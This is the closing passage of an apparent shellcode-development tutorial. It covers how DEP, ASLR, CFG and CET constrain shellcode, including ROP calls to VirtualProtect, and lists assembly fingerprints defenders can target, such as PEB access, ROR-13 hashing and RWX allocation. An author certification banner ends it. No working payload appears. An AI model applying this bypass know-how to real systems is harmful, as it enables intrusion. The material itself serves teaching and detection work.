  <line x1="375" y1="175" x2="375" y2="248" stroke="#00ff88" stroke-width="1.5" marker-end="url(#ta20)"/>
</svg></div>

*Figure 21.2 - The tooling ecosystem: Python scripts handle assembly and byte scanning, WinDbg handles runtime debugging, and the cycle repeats until the payload is clean.*

> **Pro tip:** Keep a personal library of tested building blocks: `find_kernel32`, `find_function`, string-push sequences for common DLL names, and the ctypes test harness. New payloads become an assembly job rather than a greenfield project.

---

## 22. Mitigations, Ethics, and Closing Thoughts

### Modern Defenses That Impact Shellcode

Each layer adds a barrier that shellcode must defeat. Understanding these helps both attackers (for authorized testing) and defenders (for building detections).

<div align="center"><svg viewBox="0 0 750 360" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs><linearGradient id="bg_s101" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s101"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s101" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient></defs>
  <rect width="750" height="360" rx="10" fill="url(#bg_s101)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s101)"/>
<text x="375" y="28" fill="#e0e7ff" font-size="15" text-anchor="middle" filter="url(#glow_s101)" font-weight="bold">Defense-in-Depth: Shellcode Mitigation Layers</text>
<!-- Layer 4 - CET (outermost) -->
<rect x="60" y="50" width="630" height="280" rx="10" fill="none" stroke="#ff3366" stroke-width="2"/>
<text x="375" y="72" fill="#ff3366" font-size="13" text-anchor="middle" font-weight="bold">CET (Control-flow Enforcement Technology)</text>
<text x="375" y="88" fill="#8b949e" font-size="10" text-anchor="middle">Hardware shadow stack catches return-address overwrites</text>
<!-- Layer 3 - CFG -->
<rect x="100" y="98" width="550" height="218" rx="8" fill="none" stroke="#ff6b35" stroke-width="2"/>
<text x="375" y="118" fill="#ff6b35" font-size="13" text-anchor="middle" font-weight="bold">CFG (Control Flow Guard)</text>
<text x="375" y="134" fill="#8b949e" font-size="10" text-anchor="middle">Validates indirect call targets against a legitimate-function bitmap</text>
<!-- Layer 2 - ASLR -->
<rect x="140" y="145" width="470" height="155" rx="7" fill="none" stroke="#00ff88" stroke-width="2"/>
<text x="375" y="165" fill="#00ff88" font-size="13" text-anchor="middle" font-weight="bold">ASLR (Address Space Layout Randomization)</text>
<text x="375" y="181" fill="#8b949e" font-size="10" text-anchor="middle">Randomizes DLL base addresses -- PEB walk bypasses, but initial redirect must adapt</text>
<!-- Layer 1 - DEP (innermost) -->
<rect x="180" y="192" width="390" height="90" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
<text x="375" y="218" fill="#00d4ff" font-size="14" text-anchor="middle" font-weight="bold">DEP (Data Execution Prevention)</text>
<text x="375" y="238" fill="#e0e7ff" font-size="10" text-anchor="middle">Stack/heap marked NX -- need ROP chain to</text>
<text x="375" y="254" fill="#e0e7ff" font-size="10" text-anchor="middle">VirtualProtect or VirtualAlloc(RWX) first</text>
<text x="375" y="275" fill="#ff3366" font-size="11" text-anchor="middle" font-weight="bold">Shellcode runs HERE (if all layers bypassed)</text>
<!-- Bottom note -->
<text x="375" y="345" fill="#e0e7ff" font-size="11" text-anchor="middle">Each layer must be bypassed independently -- defense stacking raises the bar exponentially</text>
</svg></div>

*Figure 22.1 - Modern defenses form concentric barriers. DEP is the innermost (most common to bypass via ROP), while CET is the newest hardware-level defense.*

**DEP (Data Execution Prevention)** marks stack and heap memory as non-executable. Attackers must first use ROP to call `VirtualProtect` or `VirtualAlloc` to mark memory executable.

**ASLR (Address Space Layout Randomization)** randomizes DLL base addresses. Our PEB walk still works because it resolves at runtime, but the exploit's initial redirect (e.g., `jmp esp`) must defeat ASLR through an information leak or non-ASLR module.

**CFG (Control Flow Guard)** validates indirect call targets against a bitmap of legitimate function entry points.

**CET (Control-flow Enforcement Technology)** is Intel's hardware-level defense with a shadow stack that catches return address overwrites.

### Why This Matters for Defenders

When you see a suspicious memory region in a forensic dump, you can recognize the PEB walk pattern. When an EDR flags `VirtualAlloc` with RWX permissions, you understand why that is suspicious. When you write detection signatures, you can target structural patterns -- `fs:[0x30]`, the `ror edx, 0x0d` loop, `rep stosb` zero-fill -- rather than relying on fragile byte signatures.

Understanding the attacker's craft makes you a better defender. Full stop.

<div align="center"><svg viewBox="0 0 750 330" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Consolas, monospace;">
  <defs>
    <linearGradient id="bg_s116" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <filter id="glow_s116"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter>
    <linearGradient id="line_s116" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="330" rx="10" fill="url(#bg_s116)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s116)"/>
  <text x="375" y="28" text-anchor="middle" fill="#e0e7ff" font-size="15" filter="url(#glow_s116)" font-weight="bold">Structural Patterns for Detection</text>
  <text x="375" y="48" text-anchor="middle" fill="#8b949e" font-size="10">Shellcode fingerprints that defenders can target in signatures and memory scans</text>
  <!-- Pattern 1: PEB access -->
  <rect x="30" y="65" width="215" height="70" rx="6" fill="#151b28" stroke="#ff3366" stroke-width="2"/>
  <text x="137" y="85" text-anchor="middle" fill="#ff3366" font-size="11" font-weight="bold">PEB Access</text>
  <text x="137" y="103" text-anchor="middle" fill="#e0e7ff" font-size="10">mov eax, fs:[0x30]</text>
  <text x="137" y="123" text-anchor="middle" fill="#8b949e" font-size="9">TEB -> PEB traversal</text>
  <!-- Pattern 2: ROR hash loop -->
  <rect x="268" y="65" width="215" height="70" rx="6" fill="#151b28" stroke="#ff6b35" stroke-width="2"/>
  <text x="375" y="85" text-anchor="middle" fill="#ff6b35" font-size="11" font-weight="bold">Hash Loop</text>
  <text x="375" y="103" text-anchor="middle" fill="#e0e7ff" font-size="10">ror edx, 0x0d; add edx, eax</text>
  <text x="375" y="123" text-anchor="middle" fill="#8b949e" font-size="9">ROR-13 function name hashing</text>
  <!-- Pattern 3: VirtualAlloc RWX -->
  <rect x="506" y="65" width="215" height="70" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="2"/>
  <text x="613" y="85" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">RWX Allocation</text>
  <text x="613" y="103" text-anchor="middle" fill="#e0e7ff" font-size="10">VirtualAlloc(0x40)</text>
  <text x="613" y="123" text-anchor="middle" fill="#8b949e" font-size="9">PAGE_EXECUTE_READWRITE</text>
  <!-- Arrow connectors (detection chain) -->
  <line x1="137" y1="135" x2="137" y2="155" stroke="#ff3366" stroke-width="1.5"/>
  <line x1="375" y1="135" x2="375" y2="155" stroke="#ff6b35" stroke-width="1.5"/>
  <line x1="613" y1="135" x2="613" y2="155" stroke="#00d4ff" stroke-width="1.5"/>
  <!-- Timeline bar -->
  <rect x="30" y="155" width="690" height="4" rx="2" fill="#8b949e" opacity="0.5"/>
  <circle cx="137" cy="157" r="5" fill="#ff3366"/><circle cx="375" cy="157" r="5" fill="#ff6b35"/><circle cx="613" cy="157" r="5" fill="#00d4ff"/>
  <text x="137" y="178" text-anchor="middle" fill="#ff3366" font-size="9">Stage 1: Locate</text>
  <text x="375" y="178" text-anchor="middle" fill="#ff6b35" font-size="9">Stage 2: Resolve</text>
  <text x="613" y="178" text-anchor="middle" fill="#00d4ff" font-size="9">Stage 3: Execute</text>
  <!-- Pattern 4: API resolution -->
  <rect x="30" y="195" width="215" height="70" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="137" y="215" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">API Resolution</text>
  <text x="137" y="233" text-anchor="middle" fill="#e0e7ff" font-size="10">push hash; call find_func</text>
  <text x="137" y="253" text-anchor="middle" fill="#8b949e" font-size="9">Hash-based export lookup</text>
  <!-- Pattern 5: Zero-fill -->
  <rect x="268" y="195" width="215" height="70" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="375" y="215" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Zero-Fill</text>
  <text x="375" y="233" text-anchor="middle" fill="#e0e7ff" font-size="10">xor eax,eax; rep stosb</text>
  <text x="375" y="253" text-anchor="middle" fill="#8b949e" font-size="9">Struct initialization pattern</text>
  <!-- Pattern 6: Stack strings -->
  <rect x="506" y="195" width="215" height="70" rx="6" fill="#151b28" stroke="#00ff88" stroke-width="2"/>
  <text x="613" y="215" text-anchor="middle" fill="#00ff88" font-size="11" font-weight="bold">Stack Strings</text>
  <text x="613" y="233" text-anchor="middle" fill="#e0e7ff" font-size="10">push 0x2e646d63</text>
  <text x="613" y="253" text-anchor="middle" fill="#8b949e" font-size="9">Runtime string construction</text>
  <!-- Bottom summary -->
  <rect x="80" y="282" width="590" height="32" rx="6" fill="#151b28" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="375" y="303" text-anchor="middle" fill="#00d4ff" font-size="11" font-weight="bold">Target structural patterns, not fragile byte signatures -- shellcode mutates, structure persists</text>
</svg></div>

*Figure 22.2 - Structural detection patterns. These code patterns appear in virtually all PEB-walking shellcode and are far more reliable detection targets than specific byte sequences.*

### Final Reflection

Shellcode is not magic. It is careful, patient engineering: finding a DLL by walking linked lists, matching function names by computing hashes, building data structures one DWORD at a time, and calling the same Windows APIs that every normal program uses -- just without the luxury of a compiler, a linker, or an import table.

The machine does not care whether instructions come from a `.exe` on disk or from a buffer in memory. It executes what it is told.

---

---

## About the Author

### Certifications

<div align="center"><svg viewBox="0 0 750 210" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Arial, sans-serif;">
  <defs>
    <linearGradient id="cbg" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient>
    <linearGradient id="bdg-b" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#1e3a5f"/><stop offset="100%" stop-color="#0f2340"/></linearGradient>
    <linearGradient id="bdg-r" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#5f1e2e"/><stop offset="100%" stop-color="#3f0f1a"/></linearGradient>
    <linearGradient id="bdg-g" x1="0" y1="0" x2="0" y2="1"><stop offset="0%" stop-color="#1e5f3a"/><stop offset="100%" stop-color="#0f3f20"/></linearGradient>
  </defs>
  <rect width="750" height="210" rx="10" fill="url(#cbg)"/>
  <!-- Row 1 -->
  <rect x="15" y="15" width="118" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff3366" stroke-width="1.5"/>
  <text x="74" y="36" text-anchor="middle" fill="#ff3366" font-size="15" font-weight="bold">CWEE</text>
  <text x="74" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Web Exploitation Expert</text>
  <rect x="143" y="15" width="118" height="50" rx="8" fill="url(#bdg-b)" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="202" y="36" text-anchor="middle" fill="#00d4ff" font-size="15" font-weight="bold">CPTS</text>
  <text x="202" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Penetration Testing Specialist</text>
  <rect x="271" y="15" width="118" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff3366" stroke-width="1.5"/>
  <text x="330" y="36" text-anchor="middle" fill="#ff3366" font-size="15" font-weight="bold">CWES</text>
  <text x="330" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Web Exploitation Specialist</text>
  <rect x="399" y="15" width="118" height="50" rx="8" fill="url(#bdg-g)" stroke="#00ff88" stroke-width="1.5"/>
  <text x="458" y="36" text-anchor="middle" fill="#00ff88" font-size="15" font-weight="bold">CJCA</text>
  <text x="458" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Junior Cybersecurity Analyst</text>
  <rect x="527" y="15" width="100" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="577" y="36" text-anchor="middle" fill="#ff6b35" font-size="15" font-weight="bold">CRTM</text>
  <text x="577" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Red Team Master</text>
  <rect x="637" y="15" width="100" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="687" y="36" text-anchor="middle" fill="#ff6b35" font-size="15" font-weight="bold">CRTE</text>
  <text x="687" y="54" text-anchor="middle" fill="#8b949e" font-size="7">Red Team Expert</text>
  <!-- Row 2 -->
  <rect x="15" y="78" width="118" height="50" rx="8" fill="url(#bdg-b)" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="74" y="99" text-anchor="middle" fill="#00d4ff" font-size="15" font-weight="bold">CRTP</text>
  <text x="74" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Red Team Professional</text>
  <rect x="143" y="78" width="118" height="50" rx="8" fill="url(#bdg-r)" stroke="#ff6b35" stroke-width="1.5"/>
  <text x="202" y="99" text-anchor="middle" fill="#ff6b35" font-size="15" font-weight="bold">CRTO</text>
  <text x="202" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Red Team Operator</text>
  <rect x="271" y="78" width="118" height="50" rx="8" fill="url(#bdg-b)" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="330" y="99" text-anchor="middle" fill="#00d4ff" font-size="15" font-weight="bold">eWPTX</text>
  <text x="330" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Web Pentester eXtreme</text>
  <rect x="399" y="78" width="118" height="50" rx="8" fill="url(#bdg-g)" stroke="#00ff88" stroke-width="1.5"/>
  <text x="458" y="99" text-anchor="middle" fill="#00ff88" font-size="15" font-weight="bold">eCPPT</text>
  <text x="458" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Professional Pentester</text>
  <rect x="527" y="78" width="210" height="50" rx="8" fill="url(#bdg-b)" stroke="#00d4ff" stroke-width="1.5"/>
  <text x="632" y="99" text-anchor="middle" fill="#00d4ff" font-size="15" font-weight="bold">eMAPT</text>
  <text x="632" y="117" text-anchor="middle" fill="#8b949e" font-size="7">Mobile Application Pentester</text>
  <!-- Divider -->
  <rect x="100" y="145" width="550" height="1" rx="1" fill="#1e3a5f" opacity="0.5"/>
  <!-- Attribution -->
  <text x="375" y="175" text-anchor="middle" fill="#e0e7ff" font-size="14">SadlyRemo</text>
  <text x="375" y="198" text-anchor="middle" fill="#8b949e" font-size="10">Reverse Engineering and Exploit Development</text>
</svg></div>

<div align="center"><svg viewBox="0 0 750 100" width="750" xmlns="http://www.w3.org/2000/svg" style="font-family: 'Segoe UI', Arial, sans-serif;">
  <defs>
    <linearGradient id="gline" x1="0" y1="0" x2="1" y2="0">
      <stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/>
      <stop offset="50%" stop-color="#00ff88" stop-opacity="0.8"/>
      <stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/>
    </linearGradient>
      <linearGradient id="bg_s213" x1="0" y1="0" x2="1" y2="1"><stop offset="0%" stop-color="#0a0e17"/><stop offset="100%" stop-color="#111827"/></linearGradient><filter id="glow_s213"><feGaussianBlur stdDeviation="2" result="blur"/><feMerge><feMergeNode in="blur"/><feMergeNode in="SourceGraphic"/></feMerge></filter><linearGradient id="line_s213" x1="0" y1="0" x2="1" y2="0"><stop offset="0%" stop-color="#00d4ff" stop-opacity="0"/><stop offset="50%" stop-color="#00ff88" stop-opacity="0.5"/><stop offset="100%" stop-color="#00d4ff" stop-opacity="0"/></linearGradient>
  </defs>
  <rect width="750" height="100" rx="10" fill="url(#bg_s213)"/>
  <rect x="50" y="2" width="650" height="1" rx="1" fill="url(#line_s213)"/>
  <rect x="75" y="15" width="600" height="1" fill="url(#gline)"/>
  <text x="375" y="52" text-anchor="middle" fill="#00ff88" font-size="18" filter="url(#glow_s213)" font-weight="bold">Go build something the CPU has never seen before.</text>
  <rect x="75" y="72" width="600" height="1" fill="url(#gline)"/>
  <text x="375" y="93" text-anchor="middle" fill="#4a5568" font-size="11">The machine is waiting.</text>
</svg></div>
